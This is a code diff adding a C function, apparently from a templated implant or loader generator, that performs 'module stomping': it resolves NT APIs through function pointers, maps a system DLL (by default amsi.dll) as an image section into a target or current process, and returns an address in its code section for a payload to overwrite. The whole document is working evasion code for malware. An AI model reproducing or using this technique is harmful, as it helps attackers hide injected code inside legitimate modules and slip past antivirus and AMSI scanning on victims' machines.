@@ -1,0 +1,44 @@
+void* AllocateExecutableMemory(HANDLE hTargetProcess, SIZE_T size) {
+    if (pfnCreateFileA == NULL || pfnNtCreateSection == NULL || pfnNtMapViewOfSection == NULL) {
+        DEBUG_PRINT("ModuleStomping: Required APIs not resolved!");
+        return NULL;
+    }
+
+    char dllPath[] = "{{ stomp_dll_path | default('C:\\Windows\\System32\\amsi.dll') | replace('\\', '\\\\') }}";
+    
+    DEBUG_PRINT("ModuleStomping: Opening %s...", dllPath);
+    
+    HANDLE hFile = pfnCreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DEBUG_PRINT("ModuleStomping: CreateFileA failed. Error %d", pfnGetLastError ? pfnGetLastError() : 0);
+        return NULL;
+    }
+
+    HANDLE hSection = NULL;
+    // SEC_IMAGE = 0x1000000
+    NTSTATUS status = pfnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_READ, 0x1000000, hFile);
+    pfnCloseHandle(hFile);
+
+    if (!NT_SUCCESS(status)) {
+        DEBUG_PRINT("ModuleStomping: NtCreateSection (SEC_IMAGE) failed 0x%X", status);
+        return NULL;
+    }
+
+    PVOID pBaseAddress = NULL;
+    SIZE_T viewSize = 0;
+    HANDLE hProc = (hTargetProcess == (HANDLE)-1) ? GetCurrentProcess() : hTargetProcess;
+
+    status = pfnNtMapViewOfSection(hSection, hProc, &pBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
+    pfnCloseHandle(hSection);
+
+    if (!NT_SUCCESS(status)) {
+        DEBUG_PRINT("ModuleStomping: NtMapViewOfSection failed 0x%X", status);
+        return NULL;
+    }
+
+    DEBUG_PRINT("ModuleStomping: Successfully mapped image at %p", pBaseAddress);
+    
+    // Offset to .text section (Simplification: Header is 0x1000)
+    // A robust implementation would parse PE headers here.
+    return (void*)((ULONG_PTR)pBaseAddress + 0x1000);
+}
